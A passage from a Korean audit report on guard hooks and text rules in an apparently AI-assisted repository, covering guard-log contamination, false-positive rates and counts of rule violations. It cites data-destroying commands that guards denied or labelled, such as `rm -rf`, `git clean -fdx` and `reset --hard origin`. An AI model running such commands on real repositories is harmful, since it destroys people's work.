시각 2건뿐이다: `2026-09-07 12:02:08~09`(10건) · `2026-09-09 16:50:47~48`(10건). 5개 케이스(`test_guard_policy.py:45-49`) x 훅 2종 x 실행 2회 = 20 으로 정확히 일치한다.

**정탐 0 · 일상 작업 0 · 테스트 오염 20.**

### 3.5 참고 — 가장 많이 발화한 실제 가드의 오탐률

`deploy 푸시 타 세션 커밋 포함` 실제 95건 중 명령에 `git push` 가 들어 있는 행은 **22건**뿐이고 **73건이 오탐**이다(`git fetch`, `git add` + `cherry-pick --continue`, `git log`, `pre_push_smoke.ps1` 실행 등에서 발화). 명령: 파싱본에 `re.search(r'git\s+push', cmd)`.
실제 deny 5건 중 4건도 라벨과 명령이 어긋난다: `git cherry-pick --abort` 에 `reset --hard origin` 라벨(2026-09-08 14:10:14), `gh run list` 에 `rm 재귀 삭제` 라벨(2026-09-09 11:32:54), `git worktree remove --force` 에 `rm 재귀 삭제` 라벨(2026-09-09 14:27:46), 스크래치패드 `rm -rf "$S"` 에 `reset --hard origin` 라벨(2026-09-09 16:53:49). 라벨과 명령이 맞는 실제 deny 는 `git clean -fdx` 1건(2026-09-07 11:19:13)뿐이다.

---

## 4. 텍스트 규칙만으로 지켜진 것 (위반 카운트)

| # | 규칙 | 경로:행 | 코드 가드 | 위반 검출 명령 | 결과 |
|---|---|---|---|---|---|
| 1 | 커밋 메시지 한자 금지 | `CLAUDE.md:6`, `CLAUDE.md:87` | 없음 | 지시서 명령 `git log --since=2026-08-03 --format=%B \| grep -cP "[\x{4e00}-\x{9fff}]"` 은 이 환경에서 실패한다(`grep: -P supports only unibyte and UTF-8 locales`). 대체: `git log --since=2026-08-03 --format=%B > msgs.txt` 후 `python -c "import io,re; t=io.open('msgs.txt',encoding='utf-8').read(); print(len(re.findall(r'[\u4e00-\u9fff]',t)))"` | **위반 1건** — 한자 2문자, 1행. `3e7a5099c`(2026-08-27) 본문 12행 본문 12행  자리의 한자 2문자. 위반률 1/1,480커밋 = 0.07% |
| 2 | 인라인 스타일 금지 | `CLAUDE.md:70`(+`:45` 중복) | 없음 | `git log --since=2026-08-03 -p -- templates static \| grep -c '^+.*style="'` | **위반 76행** (그중 `style="display..."` 상태 토글 13행 제외하면 순수 장식 63행). 명령: 같은 파이프에 `grep -c '^+.*style="display'` = 13 |
| 3 | jQuery 금지 | `CLAUDE.md:71` | 없음 | `git log --since=2026-08-03 -p -- static templates \| grep -cE '^\+.*\$\('` | **위반 0** |
| 4 | bare except 금지 | `CLAUDE.md:67` | 없음 | `git log --since=2026-08-03 -p -- foms apps services \| grep -cE '^\+\s*except\s*:'` | **위반 0** |
| 5 | 에러 숨기기(`except ...: pass`) 금지 | `AGENTS.md:42` 금지 행위 · `CLAUDE.md:96` | 없음 | `git log --since=2026-08-03 -p -- foms apps services \| grep -cE '^\+\s*except.*:\s*pass\s*$'` | **위반 0** |
| 6 | structured_data(JSONB) `flag_modified` 패턴 | `CLAUDE.md:57-65` | 없음 | 커밋 단위 대조: `.structured_data =` 신규 추가가 있는데 같은 커밋에 `flag_modified(` 신규가 없는 커밋 수 (python 으로 `git log --since=2026-08-03 --format=%H -p -- foms apps services` 를 커밋별로 갈라 정규식 대조) | **위반 후보 2커밋** (`dfb18a923`, `cb1834f52`). 신규 대입 9행 대 신규 `flag_modified` 21행이라 전반 준수. 2건은 기존 패턴 블록 안 수정일 가능성이 있어 확정 위반 아님 |

보조 사실: `git commit -m "한글"` 사용 여부는 **판별 불가**다 — 커밋 객체에는 메시지 결과만 남고 `-m` 인지 `-F` 인지 흔적이 없다. 가드 로그로도 확인 불가(로그 창이 사흘뿐).

### 4.1 판정

- **완전 준수(위반 0)**: jQuery 금지 · bare except 금지 · `except: pass` 금지. → **"지켜짐 — 규칙 덕인지 모델 기본인지 미분리(§7 실험 대상)"**. 셋 다 지시서 §5 항목 15 가 "모델 기본 행동" 으로 지목한 항목군이므로 팔 C(무규칙)에서 위반이 나오는지가 판정선이다.
- **거의 준수(위반 1건, 0.07%)**: 커밋 메시지 한자 금지. → 지켜짐에 가깝다. 코드화 이득이 작아 KEEP-PREF 유지가 타당하다.
- **준수 실패(위반 76행)**: 인라인 스타일 금지. → **텍스트 규칙이 못 막았다. MOVE-TO-CODE.** 게다가 같은 규칙이 `CLAUDE.md:45` 와 `:70` 두 곳에 있는데도 76행이 들어왔다 — 산문을 두 번 적는 것이 준수율을 올리지 못한다는 직접 증거다(§3 H4 지지).
- **판정 보류**: JSONB 패턴(위반 후보 2, 확정 불가) · `-m` 금지(판별 불가).

---

## 5. 이 조각이 다른 워커의 판정에 주는 입력

1. **§5 항목 4 는 뒤집힌다.** `guard_policy` 의 `production 푸시` ask 16건은 실 발화가 아니다. `Remove-Item` 20건, `pip install` 36건도 0건이다. 이 세 라벨에는 "2026-08-03 이후 실제 발화 1건 이상" 이라는 §4.2 KEEP-CODE 조건을 만족시킬 증거가 **없다**. 다만 로그 창이 사흘뿐이므로 "발화 0" 이 아니라 **"관측 창 안 발화 0, 그 이전은 관측 불가"** 로 적어야 한다. §4.2 DOWNGRADE 를 곧장 적용하기보다, 로그 격리를 고친 뒤 재관측하는 것이 R2(지연 발현) 대비에 맞다.
2. **§5 항목 5(가드 테스트의 실 로그 오염)는 확정이고 규모가 두 배다.** 44행 x 2 가 아니라 **82행 x 2 = 164행**, 즉 300행 로그의 **55%** 가 테스트 산출물이다. 실효 측정 자체가 불가능한 상태다.
3. **§5 항목 8(인벤토리 churn)은 종결되지 않았다.** 41커밋이고 최근 것이 2026-09-09 다. "lineno-무관 게이트로 종결" 이라는 메모리 기록은 재측정과 어긋난다.
4. **KEEP-CODE 근거가 확실한 것은 AI_STATUS 예산 게이트 하나다.** `tests/harness/test_hook_log_hygiene.py:184` 가 5주간 18회 red 를 냈고 매번 복구 커밋이 뒤따랐다. 텍스트 규칙(`CLAUDE.md:23`)은 예산 숫자조차 적지 않으므로 산문은 압축해도 된다.
5. **MOVE-TO-CODE 1순위는 인라인 스타일 금지다.** 76행 위반은 이 감사에서 나온 텍스트 규칙 위반 중 유일하게 반복·다수다.
6. **KEEP-FACT 신설 1건**: Railway 서비스가 4종(web·WORKER·FOMS-cron·SIDEFX)이고 환경변수가 서비스마다 다르다는 사실. 이것이 없어 2026-09-02 지오코딩 사고의 트리거 규명이 하루 늦었다(`585c225a9`).
7. **가드 라벨 정확도가 낮다.** 최다 발화 라벨의 오탐률 77%(95건 중 73건), 실제 deny 5건 중 4건 라벨 불일치. 지연 비용(Bash 1회당 약 160ms)을 정당화하려면 판정기 자체를 먼저 고쳐야 한다.
